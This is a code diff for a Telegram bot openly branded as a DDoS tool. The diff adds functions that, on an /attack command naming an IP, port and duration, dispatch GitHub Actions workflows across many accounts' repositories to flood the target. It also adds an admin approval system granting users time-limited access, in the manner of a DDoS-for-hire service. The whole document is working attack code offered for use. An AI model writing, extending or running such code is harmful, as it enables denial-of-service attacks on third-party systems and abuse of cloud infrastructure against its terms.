@@ -1,57 +1,124 @@
+def is_approved(user_id: int):
+    if user_id in approved_users:
+        return time.time() < approved_users[user_id]['expiry_time']
+    return False
+
+def approve_user(user_id: int, days: int):
+    expiry_time = time.time() + (days * 86400)
+    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}
+
+approve_user(ADMIN_ID, 36500)
+
+async def fire_workflow_async(session, token, repo, params):
+    try:
+        url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
+        headers = {
+            "Authorization": f"Bearer {token}",
+            "Accept": "application/vnd.github.v3+json",
+            "Content-Type": "application/json"
+        }
+        async with session.post(url, headers=headers, json=params, timeout=5) as response:
+            return response.status == 204
+    except:
+        return False
+
+async def trigger_all_workflows_async(ip, port, duration):
+    params = {
+        "ref": "main",
+        "inputs": {
+            "ip": str(ip),
+            "port": str(port),
+            "duration": str(duration),
+            "packet_size": str(PACKET_SIZE),
+            "threads": str(THREADS)
+        }
+    }
+    tasks = []
+    async with aiohttp.ClientSession() as session:
+        for account in GITHUB_ACCOUNTS:
+            token = account['token']
+            for repo in account['repos']:
+                tasks.append(asyncio.create_task(fire_workflow_async(session, token, repo, params)))
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome = "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Check Status"
+    await update.message.reply_text(welcome)
+
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_attack_running, attack_end_time, current_target
     
-    # 1. Check Approval
     if not is_approved(update.effective_user.id):
         await update.message.reply_text("❌ Not approved.")
         return
     
-    # 2. Check Cooldown (Non-blocking)
     now = time.time()
     if is_attack_running and now < attack_end_time:
-        remaining_time = int(attack_end_time - now)
-        await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Cooldown: {remaining_time}s\n🎯 Target: {current_target}")
+        rem = int(attack_end_time - now)
+        await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Wait: {rem}s\n🎯 Target: {current_target}")
         return
         
-    # 3. Validate Arguments
     if len(context.args) != 3:
         await update.message.reply_text("Usage: /attack <ip> <port> <time>")
         return
 
     try:
-        ip = context.args[0]
-        port = context.args[1]
+        ip, port = context.args[0], context.args[1]
         time_int = int(context.args[2])
-        
         if not (1 <= time_int <= 300):
-            await update.message.reply_text("❌ Time: 1-300 seconds")
+            await update.message.reply_text("❌ Max 300s")
             return
-            
-    except ValueError:
+    except:
         await update.message.reply_text("❌ Invalid input.")
         return
 
-    # 4. Set Global State
     is_attack_running = True
-    attack_end_time = time.time() + time_int
+    attack_end_time = now + time_int
     current_target = f"{ip}:{port}"
     
-    await update.message.reply_text(f"🚀 ATTACK DISPATCHED\n🎯 Target: {ip}:{port}\n⏰ Duration: {time_int}s")
-    
-    # 5. Run execution in background task
+    await update.message.reply_text(f"🚀 ATTACK SENT\n🎯 {ip}:{port}\n⏰ {time_int}s")
     asyncio.create_task(execute_attack(update, ip, port, time_int))
 
 async def execute_attack(update, ip, port, duration):
     global is_attack_running, current_target
     try:
-        # Trigger the API call
         await trigger_all_workflows_async(ip, port, duration)
-        # Wait for the attack duration
         await asyncio.sleep(duration)
-        await update.message.reply_text(f"✅ ATTACK COMPLETED\n🎯 Target: {ip}:{port}")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"✅ ATTACK FINISHED\n🎯 {ip}:{port}")
     finally:
-        # Reset state so the next person can use it
         is_attack_running = False
         current_target = ""
+
+async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    status = "✅ APPROVED" if is_approved(user_id) else "❌ NOT APPROVED"
+    await update.message.reply_text(f"🆔 ID: {user_id}\nStatus: {status}")
+
+async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        uid, days = int(context.args[0]), int(context.args[1])
+        approve_user(uid, days)
+        await update.message.reply_text(f"✅ Approved {uid}")
+    except: pass
+
+async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        uid = int(context.args[0])
+        if uid in approved_users: del approved_users[uid]
+        await update.message.reply_text(f"🗑️ Removed {uid}")
+    except: pass
+
+def main():
+    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("attack", attack))
+    app.add_handler(CommandHandler("Myid", Myid))
+    app.add_handler(CommandHandler("approve", approve))
+    app.add_handler(CommandHandler("remove", remove))
+    print("✅ Bot is online.")
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == "__main__":
+    main()
